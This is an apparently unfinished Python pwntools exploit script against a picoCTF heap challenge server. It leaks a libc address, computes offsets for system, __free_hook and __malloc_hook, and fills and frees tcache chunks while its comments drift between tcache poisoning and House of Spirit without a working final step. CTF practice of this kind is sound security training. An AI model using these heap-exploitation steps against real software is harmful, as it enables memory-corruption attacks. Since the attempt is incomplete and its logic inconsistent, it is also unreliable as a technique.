#!/usr/bin/env python3

from pwn import *

HOST = 'jupiter.challenges.picoctf.org'
PORT = 29476

context.log_level = 'info'
context.arch = 'amd64'

p = remote(HOST, PORT)

# Dialog
p.recvuntil(b'So, you want to be a hero?')
p.sendline(b'y')

# Get leak
data = p.recvuntil(b'>')
leak = int(data.split(b'Take this: ')[1].split(b'\n')[0], 16)
log.info(f"Leak: 0x{leak:x}")

libc_base = leak - 0x21fd0
log.info(f"Libc base: 0x{libc_base:x}")

# Important addresses
system = libc_base + 0x4f4e0
free_hook = libc_base + 0x1e75a8
malloc_hook = libc_base + 0x1e4c30

# In libc 2.29, tcache has some protections but we can still exploit
# The null byte overflow can help us bypass checks

# Allocate 7 chunks (max allowed)
for i in range(7):
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'24')  # Size 0x20 chunks for tcache
    p.recvuntil(b'description')
    p.sendline(chr(65+i).encode() * 24)
    p.recvuntil(b'>')
    log.info(f"Allocated chunk {i}")

# Free all to fill tcache
for i in range(7):
    p.sendline(b'2')
    p.recvuntil(b'remove')
    p.sendline(str(6-i).encode())  # Free in reverse order
    p.recvuntil(b'>')
    log.info(f"Freed chunk {6-i}")

# Now tcache for size 0x20 is full
# tcache: 0 -> 1 -> 2 -> 3 -> 4 -> 5 -> 6

# Allocate one back
p.sendline(b'1')
p.recvuntil(b'length')
p.sendline(b'24')
p.recvuntil(b'description')

# Try to poison tcache by writing free_hook address
# But wait, we need to be in the heap range or it will fail

# Let's try a different approach - House of Spirit
# We need to create a fake chunk at a known location

# Actually, let's try to leak heap first
# When we allocate from tcache, the fd pointer might still be there

p.sendline(b'X' * 8)  # Short input to not overwrite fd
p.recvuntil(b'>')
log.info("Allocated from tcache")

# Try to trigger something with the corrupted tcache
# Allocate more
for i in range(6):
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'24')
    p.recvuntil(b'description')
    p.sendline(b'Y' * 24)
    p.recvuntil(b'>')
    log.info(f"Allocated {i+1}")

# Now all slots are full again
# Let's try something else - maybe there's a win function?

# Exit and see what happens
p.sendline(b'3')

try:
    resp = p.recvall(timeout=2)
    log.info(f"Response: {resp}")
    
    if b'flag' in resp.lower() or b'pico' in resp.lower():
        log.success(f"Found something: {resp}")
except:
    pass

p.close()